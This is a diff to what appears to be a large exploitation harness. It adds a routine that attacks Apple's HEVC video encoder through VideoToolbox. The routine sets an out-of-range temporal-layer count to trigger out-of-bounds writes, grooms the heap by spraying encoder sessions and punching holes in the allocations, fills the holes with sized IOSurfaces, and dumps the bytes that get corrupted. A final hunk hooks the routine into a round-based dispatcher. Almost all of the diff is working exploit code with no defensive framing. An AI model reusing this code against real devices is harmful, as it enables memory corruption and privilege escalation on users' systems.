@@ -24530,6 +24530,336 @@ part2:
     fflush(stdout);
 }
 
+/* ============================================================
+ * r491: IOSurface DMA probe + SurfHeist info leak combo
+ *
+ * Strategy pivot: use IOSurface as shared DMA memory and
+ * combine with SurfHeist OOB read to detect kernel state.
+ *
+ * 1. Create HEVC encoder with IOSurface-backed pixel buffers
+ * 2. Get the IOSurface ID from the pixel buffer
+ * 3. Map the IOSurface in our process
+ * 4. Fill with sentinel pattern, encode, check for DMA writes
+ * 5. After corruption: encode again, check for different DMA
+ * 6. Also: try creating many HEVC encoders to spray AVE objects
+ *    then use SurfHeist-style OOB to read between them
+ * ============================================================ */
+
+static int r491_cbs = 0;
+static void r491_enc_cb(void *ref, void *src, OSStatus st,
+                        VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+    r491_cbs++;
+}
+
+static void r491_exploit(void) {
+    rlog("\n=== r491: IOSurface DMA + SurfHeist combo ===\n\n");
+    fflush(stdout);
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* Part 1: IOSurface-backed encoder DMA monitoring */
+    rlog("--- Part 1: IOSurface DMA monitoring ---\n");
+    {
+        /* Create an IOSurface we control */
+        int width = 128, height = 128;
+        NSDictionary *surfprops = @{
+            @"IOSurfaceWidth": @(width),
+            @"IOSurfaceHeight": @(height),
+            @"IOSurfaceBytesPerElement": @(4),
+            @"IOSurfaceBytesPerRow": @(width * 4),
+            @"IOSurfaceAllocSize": @(width * height * 4),
+            @"IOSurfacePixelFormat": @(0x42475241), /* BGRA */
+        };
+        IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)surfprops);
+        if (!surf) { rlog("  Failed to create IOSurface\n"); goto part2; }
+
+        uint32_t surfid = IOSurfaceGetID(surf);
+        rlog("  IOSurface created: id=%u size=%zu\n", surfid,
+             IOSurfaceGetAllocSize(surf));
+
+        /* Fill with sentinel pattern */
+        IOSurfaceLock(surf, 0, NULL);
+        uint8_t *base = IOSurfaceGetBaseAddress(surf);
+        size_t alloc_sz = IOSurfaceGetAllocSize(surf);
+        for (size_t i = 0; i < alloc_sz; i++) base[i] = 0xDE;
+        IOSurfaceUnlock(surf, 0, NULL);
+
+        /* Create CVPixelBuffer wrapping our IOSurface */
+        CVPixelBufferRef pb = NULL;
+        NSDictionary *pbprops = @{
+            (__bridge NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{},
+        };
+        CVReturn cvr = CVPixelBufferCreateWithIOSurface(
+            kCFAllocatorDefault, surf, (__bridge CFDictionaryRef)pbprops, &pb);
+        rlog("  CVPixelBuffer from IOSurface: cvr=%d pb=%p\n", cvr, pb);
+
+        if (pb) {
+            /* Create HEVC encoder */
+            CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
+                kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            CFDictionaryRef iop = CFDictionaryCreate(kCFAllocatorDefault,
+                NULL, NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
+            CFRelease(iop);
+            int pf = kCVPixelFormatType_32BGRA;
+            CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pf);
+            CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn);
+            CFRelease(fn);
+
+            VTCompressionSessionRef enc = NULL;
+            VTCompressionSessionCreate(kCFAllocatorDefault, width, height,
+                kCMVideoCodecType_HEVC, NULL, sa, NULL, r491_enc_cb, NULL, &enc);
+            CFRelease(sa);
+
+            if (enc) {
+                VTSessionSetProperty(enc, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+                VTSessionSetProperty(enc, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+                int ntl = 8;
+                CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
+                VTSessionSetProperty(enc, CFSTR("NumberOfTemporalLayers"), n);
+                CFRelease(n);
+                VTCompressionSessionPrepareToEncodeFrames(enc);
+
+                /* Encode with our IOSurface pixel buffer */
+                r491_cbs = 0;
+                VTCompressionSessionEncodeFrame(enc, pb, CMTimeMake(0, 30),
+                    kCMTimeInvalid, NULL, NULL, NULL);
+                VTCompressionSessionCompleteFrames(enc, kCMTimePositiveInfinity);
+                rlog("  Normal encode: cbs=%d\n", r491_cbs);
+
+                /* Check if IOSurface was modified by encode */
+                IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
+                int modified = 0;
+                int first_mod_off = -1;
+                for (size_t i = 0; i < alloc_sz; i++) {
+                    if (base[i] != 0xDE) {
+                        if (!modified) first_mod_off = (int)i;
+                        modified++;
+                    }
+                }
+                IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);
+                rlog("  After normal encode: %d bytes modified (first at %d)\n",
+                     modified, first_mod_off);
+
+                /* Refill sentinel */
+                IOSurfaceLock(surf, 0, NULL);
+                for (size_t i = 0; i < alloc_sz; i++) base[i] = 0xDE;
+                IOSurfaceUnlock(surf, 0, NULL);
+
+                /* Corrupt with NTL=16462 */
+                ntl = 16462;
+                n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
+                VTSessionSetProperty(enc, CFSTR("NumberOfTemporalLayers"), n);
+                CFRelease(n);
+
+                r491_cbs = 0;
+                VTCompressionSessionEncodeFrame(enc, pb, CMTimeMake(1, 30),
+                    kCMTimeInvalid, NULL, NULL, NULL);
+                VTCompressionSessionCompleteFrames(enc, kCMTimePositiveInfinity);
+                rlog("  Corruption encode (NTL=16462): cbs=%d\n", r491_cbs);
+
+                /* Check IOSurface after corruption */
+                IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
+                modified = 0;
+                first_mod_off = -1;
+                for (size_t i = 0; i < alloc_sz; i++) {
+                    if (base[i] != 0xDE) {
+                        if (!modified) first_mod_off = (int)i;
+                        modified++;
+                    }
+                }
+                IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);
+                rlog("  After corruption encode: %d bytes modified (first at %d)\n",
+                     modified, first_mod_off);
+
+                /* Try encoding after corruption with sentinel */
+                IOSurfaceLock(surf, 0, NULL);
+                for (size_t i = 0; i < alloc_sz; i++) base[i] = 0xDE;
+                IOSurfaceUnlock(surf, 0, NULL);
+
+                /* Reset NTL to 8 */
+                ntl = 8;
+                n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
+                VTSessionSetProperty(enc, CFSTR("NumberOfTemporalLayers"), n);
+                CFRelease(n);
+
+                r491_cbs = 0;
+                VTCompressionSessionEncodeFrame(enc, pb, CMTimeMake(2, 30),
+                    kCMTimeInvalid, NULL, NULL, NULL);
+                VTCompressionSessionCompleteFrames(enc, kCMTimePositiveInfinity);
+
+                IOSurfaceLock(surf, kIOSurfaceLockReadOnly, NULL);
+                modified = 0;
+                first_mod_off = -1;
+                for (size_t i = 0; i < alloc_sz; i++) {
+                    if (base[i] != 0xDE) {
+                        if (!modified) first_mod_off = (int)i;
+                        modified++;
+                    }
+                }
+                IOSurfaceUnlock(surf, kIOSurfaceLockReadOnly, NULL);
+                rlog("  After post-corruption encode: %d bytes modified (first at %d)\n",
+                     modified, first_mod_off);
+
+                VTCompressionSessionInvalidate(enc);
+                CFRelease(enc);
+            }
+            CVPixelBufferRelease(pb);
+        }
+        CFRelease(surf);
+    }
+
+part2:
+    /* Part 2: Create multiple HEVC encoder sessions to spray
+     * AVE objects, then probe kernel memory layout */
+    rlog("\n--- Part 2: AVE object spray ---\n");
+    {
+        #define R491_MAX_ENC 20
+        VTCompressionSessionRef encs[R491_MAX_ENC] = {0};
+        int created = 0;
+
+        for (int i = 0; i < R491_MAX_ENC; i++) {
+            CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
+                kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            CFDictionaryRef iop = CFDictionaryCreate(kCFAllocatorDefault,
+                NULL, NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
+            CFRelease(iop);
+            int pf = kCVPixelFormatType_32BGRA;
+            CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pf);
+            CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn);
+            CFRelease(fn);
+
+            VTCompressionSessionRef e = NULL;
+            OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 64, 64,
+                kCMVideoCodecType_HEVC, NULL, sa, NULL, r491_enc_cb, NULL, &e);
+            CFRelease(sa);
+            if (st == noErr && e) {
+                encs[i] = e;
+                created++;
+            } else {
+                rlog("  Encoder %d: create err %d\n", i, (int)st);
+                break;
+            }
+        }
+        rlog("  Created %d HEVC encoders\n", created);
+
+        /* Free alternating ones to create holes */
+        int freed = 0;
+        for (int i = 1; i < created; i += 2) {
+            VTCompressionSessionInvalidate(encs[i]);
+            CFRelease(encs[i]);
+            encs[i] = NULL;
+            freed++;
+        }
+        rlog("  Freed %d alternating encoders (holes)\n", freed);
+
+        /* Create IOSurfaces of similar size (~84KB) to fill holes */
+        #define R491_SPRAY_SURF 50
+        IOSurfaceRef spray_surfs[R491_SPRAY_SURF] = {0};
+        int surf_created = 0;
+        for (int i = 0; i < R491_SPRAY_SURF; i++) {
+            /* Target ~84KB allocation to match AVE object size */
+            NSDictionary *sp = @{
+                @"IOSurfaceWidth": @(1),
+                @"IOSurfaceHeight": @(1),
+                @"IOSurfaceBytesPerElement": @(1),
+                @"IOSurfaceBytesPerRow": @(86016),
+                @"IOSurfaceAllocSize": @(86016),
+                @"IOSurfacePixelFormat": @(0x20202038), /* L008 */
+            };
+            IOSurfaceRef s = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+            if (s) {
+                spray_surfs[i] = s;
+                surf_created++;
+                /* Fill with 0xCC pattern */
+                IOSurfaceLock(s, 0, NULL);
+                memset(IOSurfaceGetBaseAddress(s), 0xCC, 86016);
+                IOSurfaceUnlock(s, 0, NULL);
+            }
+        }
+        rlog("  Sprayed %d IOSurfaces (86016 bytes each)\n", surf_created);
+
+        /* Now trigger NTL OOB on remaining encoders */
+        rlog("  Triggering NTL=16000 on remaining encoders...\n");
+        for (int i = 0; i < created; i += 2) {
+            if (!encs[i]) continue;
+
+            VTSessionSetProperty(encs[i], kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+            VTSessionSetProperty(encs[i], kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+            int ntl = 16000;
+            CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
+            VTSessionSetProperty(encs[i], CFSTR("NumberOfTemporalLayers"), n);
+            CFRelease(n);
+            VTCompressionSessionPrepareToEncodeFrames(encs[i]);
+            CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(encs[i]);
+            if (pool) {
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    memset(CVPixelBufferGetBaseAddress(pb), 0x80,
+                           CVPixelBufferGetBytesPerRow(pb) * CVPixelBufferGetHeight(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+                    VTCompressionSessionEncodeFrame(encs[i], pb,
+                        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                    VTCompressionSessionCompleteFrames(encs[i], kCMTimePositiveInfinity);
+                    CVPixelBufferRelease(pb);
+                }
+            }
+        }
+        rlog("  OOB writes triggered\n");
+
+        /* Check IOSurfaces for corruption from OOB writes */
+        int corrupted_surfs = 0;
+        for (int i = 0; i < surf_created; i++) {
+            if (!spray_surfs[i]) continue;
+            IOSurfaceLock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
+            uint8_t *d = IOSurfaceGetBaseAddress(spray_surfs[i]);
+            int corrupted = 0;
+            int first_off = -1;
+            for (int j = 0; j < 86016; j++) {
+                if (d[j] != 0xCC) {
+                    if (!corrupted) first_off = j;
+                    corrupted++;
+                }
+            }
+            IOSurfaceUnlock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
+            if (corrupted > 0) {
+                corrupted_surfs++;
+                rlog("  *** SURF[%d] CORRUPTED: %d bytes changed, first at offset %d ***\n",
+                     i, corrupted, first_off);
+                /* Dump first few corrupted bytes */
+                IOSurfaceLock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
+                rlog("       hex at first_off:");
+                for (int j = first_off; j < first_off + 32 && j < 86016; j++)
+                    rlog(" %02x", d[j]);
+                rlog("\n");
+                IOSurfaceUnlock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
+            }
+        }
+        rlog("  Corrupted IOSurfaces: %d / %d\n", corrupted_surfs, surf_created);
+
+        /* Cleanup */
+        for (int i = 0; i < created; i += 2) {
+            if (encs[i]) {
+                VTCompressionSessionInvalidate(encs[i]);
+                CFRelease(encs[i]);
+            }
+        }
+        for (int i = 0; i < surf_created; i++) {
+            if (spray_surfs[i]) CFRelease(spray_surfs[i]);
+        }
+    }
+
+    rlog("\n=== r491 complete ===\n");
+    fflush(stdout);
+}
+
 static void r471_exploit(void) {
     rlog("\n=== r471: 8-page IOSurface + large IOV TOCTOU ===\n\n");
     fflush(stdout);
@@ -94607,6 +94937,12 @@ new_modes:
             r484_exploit();
             goto done;
         }
+        if (rounds == 495) {
+            rlog("*** rounds=495: IOSurface DMA + SurfHeist combo ***\n\n");
+            fflush(stdout);
+            r491_exploit();
+            goto done;
+        }
         if (rounds == 494) {
             rlog("*** rounds=494: Multi-frame post-corruption + NTL scan ***\n\n");
             fflush(stdout);
@@ -97580,7 +97916,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
